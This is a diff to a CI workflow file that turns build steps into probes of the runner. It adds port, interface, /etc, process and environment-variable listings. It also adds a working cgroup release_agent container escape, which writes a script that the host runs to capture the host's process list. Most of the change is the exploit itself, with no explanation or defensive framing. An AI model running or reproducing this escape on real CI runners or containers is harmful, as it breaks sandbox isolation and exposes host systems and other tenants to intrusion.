@@ -30,16 +30,29 @@ jobs:
       - name: Open ports
         run: sudo ss -ntlp
 
+      - name: Create interface?
+        run: sudo ip link add dummy0 type dummy
+
       - name: Interfaces
         run: sudo ip link show
 
       - name: /etc directory
         run: ls -la /etc
 
-      - name: Add ssh key for runner
+      - name: ps aux on container
+        run: sudo ps aux
+
+      - name: Ps aux on "host"?
         run: |
-          sudo ls -la /home/runner/
-          sudo ls -la /home/runner/.ssh
+          mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+          echo 1 > /tmp/cgrp/x/notify_on_release
+          host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+          echo "$host_path/cmd" > /tmp/cgrp/release_agent
+          echo '#!/bin/sh' > /cmd
+          echo "ps aux > $host_path/output" >> /cmd
+          chmod a+x /cmd
+          sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
 
       - name: Display Environment Variables
         run: env
